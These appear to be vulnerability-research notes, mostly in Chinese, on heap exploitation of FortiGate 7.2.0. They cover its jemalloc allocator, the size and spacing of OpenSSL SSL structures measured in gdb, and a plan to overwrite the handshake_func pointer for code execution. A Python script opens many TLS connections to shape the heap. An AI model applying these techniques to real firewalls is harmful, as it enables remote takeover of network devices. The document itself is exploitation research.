# FGT 7_2_0

### 内存分配器

分析发现，FGT基本全使用jemalloc进行内存分配

通过代码分析发现：

```
CRYPTO_set_mem_functions(sub_1716960, sub_1716990, sub_1716980) 
```

指定SSL结构体的分配器为jemalloc

```
#0  0x00007f07161e1a90 in je_malloc () from /usr/lib/x86_64-linux-gnu/libjemalloc.so.2
#1  0x0000000001716969 in ?? ()
#2  0x00007f07157d08ca in CRYPTO_zalloc () from /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
#3  0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#4  0x00000000017111c2 in ?? ()
```

### jemalloc

jemalloc 源码分析：https://youjiali1995.github.io/allocator/jemalloc/

Jemalloc 源码分析: https://blog.csdn.net/liuxunwei1/article/details/138155256

As it sounded pretty hard to get anything working, we took a look at the underlying allocator, to see if there were any way to leverage the bug.

The underlying heap, jemalloc, was unknown to us at the time. We were in a hurry (understand: I ragequit when trying to make shadow work) and not looking to acquire a deep understanding of it. Here's what we learned about it:

- Heap metadata is stored independently; you can safely overflow from one chunk (region) to another
- You can easily get contiguous allocations (after filling holes)
- There is some kind of LIFO mechanism on allocations of the same size: freeing a chunk of size N and allocating the same size yields the same pointer.

The last point actually makes the exploitation very much easier: we can allocate the buffer we overflow from, out, at the same address, repeatedly.

版本定位：

```
/ # busybox strings /lib/libjemalloc.so.2  | grep 5
5.2.1-0-gea6b3e973b477b8061e0076bb257dbd7f3faa756
```

### SSL 结构体

通过openssl 中的函数 SSL_new 可以定位 SSL 结构体分配的大小以及位置，该函数的实现位于/lib/libssl.so.1.1中

```c
__int64 __fastcall SSL_new(__int64 a1)
{
........................................
  v3 = CRYPTO_zalloc(6280LL, "ssl/ssl_lib.c", 691LL);
........................................
}
```

大小6280（0x1888）

```
(gdb) bt
#0  0x00007f07161e1a90 in je_malloc () from /usr/lib/x86_64-linux-gnu/libjemalloc.so.2
#1  0x0000000001716969 in ?? ()
#2  0x00007f07157d08ca in CRYPTO_zalloc () from /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
#3  0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#4  0x00000000017111c2 in ?? ()
#5  0x000000000171384c in ?? ()
#6  0x000000000171481c in ?? ()
#7  0x00000000017150e4 in ?? ()
#8  0x0000000001715d47 in ?? ()
#9  0x0000000001716f42 in ?? ()
#10 0x0000000001717236 in ?? ()
#11 0x0000000001717e5d in ?? ()
#12 0x000000000044c88f in ?? ()
#13 0x00000000004554ca in ?? ()
#14 0x000000000045212c in ?? ()
#15 0x0000000000454738 in ?? ()
#16 0x0000000000455061 in ?? ()
#17 0x00007f0715b89deb in __libc_start_main () from /usr/lib/x86_64-linux-gnu/libc.so.6
#18 0x0000000000447daa in ?? ()
(gdb) print $rdi
$1 = 6280
```

常规利用方式为：修改SSL结构体的handshake_func函数指针字段，触发：

```c
int SSL_do_handshake(SSL *s)
{
    int ret = 1;

    if (s->handshake_func == NULL) {
        SSLerr(SSL_F_SSL_DO_HANDSHAKE, SSL_R_CONNECTION_TYPE_NOT_SET);
        return -1;
    }

    ossl_statem_check_finish_init(s, -1);

    s->method->ssl_renegotiate_check(s, 0);

    if (SSL_in_init(s) || SSL_in_before(s)) {
        if ((s->mode & SSL_MODE_ASYNC) && ASYNC_get_current_job() == NULL) {
            struct ssl_async_args args;

            args.s = s;

            ret = ssl_start_async_job(s, &args, ssl_do_handshake_intern);
        } else {
            ret = s->handshake_func(s);
        }
    }
    return ret;
}
```

函数，从而达到任意代码执行

#####  ssl 分配地址情况

python测试脚本：

```python
#!/usr/bin/python3
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib

HOST = "192.168.182.188"
PORT = 8443  

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

ssl_socks = []

for i in range(100):
    sk = create_ssl_socket()
    ssl_socks.append(sk)

```

gdb 脚本：

```
handle SIGPIPE nostop
break *SSL_new + 0x35
commands
    print /x $rax 
    continue
end
```

```

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$633 = 0x7f070fe59000

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$634 = 0x7f070fe5ac00

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$635 = 0x7f070fe5c800

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$636 = 0x7f070fe5e400

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$637 = 0x7f070fe81000

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$638 = 0x7f070fe82c00

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$639 = 0x7f070fe84800

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$640 = 0x7f070fe86400

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$641 = 0x7f070fe88000

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$642 = 0x7f070fe89c00

Breakpoint 3, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
$643 = 0x7f070fe8b800

```

每个ssl结构体的地址相差大小为0x1c00(7168)
